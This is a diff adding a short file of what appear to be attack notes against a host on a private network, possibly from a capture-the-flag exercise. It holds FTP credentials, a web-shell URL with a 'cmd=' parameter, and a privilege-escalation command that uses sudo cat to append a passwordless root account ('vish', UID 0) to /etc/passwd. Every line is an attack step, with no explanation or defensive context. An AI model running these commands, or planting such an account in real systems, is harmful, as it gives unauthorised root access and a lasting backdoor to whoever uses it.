@@ -1,0 +1,6 @@
+ftp => username:logs password:zg]E-b0]+8:(58G
+
+http://192.168.2.120/logs/backup_log.php?cmd=
+
+sudo /usr/bin/cat >> /etc/passwd
+vish::0:0:root:/root:/bin/bash
